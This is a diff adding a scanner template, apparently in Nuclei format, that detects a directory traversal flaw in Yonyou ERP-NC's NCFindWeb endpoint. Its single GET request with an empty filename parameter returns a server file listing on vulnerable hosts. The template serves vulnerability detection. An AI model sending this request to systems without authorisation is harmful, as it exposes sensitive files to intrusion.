@@ -1,0 +1,27 @@
+id: yongyouOA-ERP-NC-NCFindWeb-dir-listing
+
+info:
+  name: 用友 ERP-NC NCFindWeb 目录遍历漏洞
+  author: cnaq
+  severity: medium   
+  description: 用友ERP-NC 存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息
+  reference: 
+    - http://wiki.peiqi.tech/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20ERP-NC%20NCFindWeb%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.html
+  tags: yongyouNC,dir,listing
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename="
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+      - type: word
+        part: body
+        condition: and
+        words:
+          - 'index.jsp'
